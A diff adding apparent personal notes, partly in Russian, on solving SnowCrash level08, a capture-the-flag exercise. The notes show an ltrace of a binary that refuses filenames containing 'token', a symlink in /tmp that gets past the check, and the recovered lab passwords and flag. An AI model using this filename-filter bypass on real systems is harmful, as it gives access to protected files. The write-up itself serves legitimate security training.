@@ -1,0 +1,36 @@
+su level08
+fiumuikeil55xe9cu4dood66h
+
+ls -la
+
+./level08
+./level08 [file to read]
+
+просит файл
+
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                                                                          = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                                                                                      = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+к token нет доступа, создаем жесткую ссылку
+
+ln -s /home/user/level08/token /tmp/token
+./level08 token /tmp/token
+
+если в имени есть подстрака token то программа завершается, дела не в доступе
+
+елаем новую ссылку
+ln -s /home/user/level08/token /tmp/pass
+./level08 token /tmp/pass
+
+quif5eloekouj29ke0vouxean
+
+su flag08
+quif5eloekouj29ke0vouxean
+
+getflag
+25749xKZ8L7DkSCwJkT9dyv6f
